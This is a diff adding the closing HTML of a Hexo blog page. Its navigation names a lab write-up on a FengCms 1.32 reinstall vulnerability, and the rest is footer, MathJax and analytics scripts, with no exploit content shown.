+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#FengCms1-32-重装漏洞"><span class="nav-number">1.</span> <span class="nav-text">FengCms1.32 重装漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#实验步骤"><span class="nav-number">1.0.1.</span> <span class="nav-text">实验步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤1：了解漏洞原理"><span class="nav-number">1.0.2.</span> <span class="nav-text">步骤1：了解漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤2：验证漏洞"><span class="nav-number">1.0.3.</span> <span class="nav-text">步骤2：验证漏洞</span></a></li></ol></li></ol></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2016 - 2018 shackle All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				访客数 : <span id="busuanzi_value_site_uv"></span> |  
+				访问量 : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1261091520&web_id=1261091520" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            shackle
+          </div>
+          <div class="panel-body">
+            Copyright © 2018 shackle All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
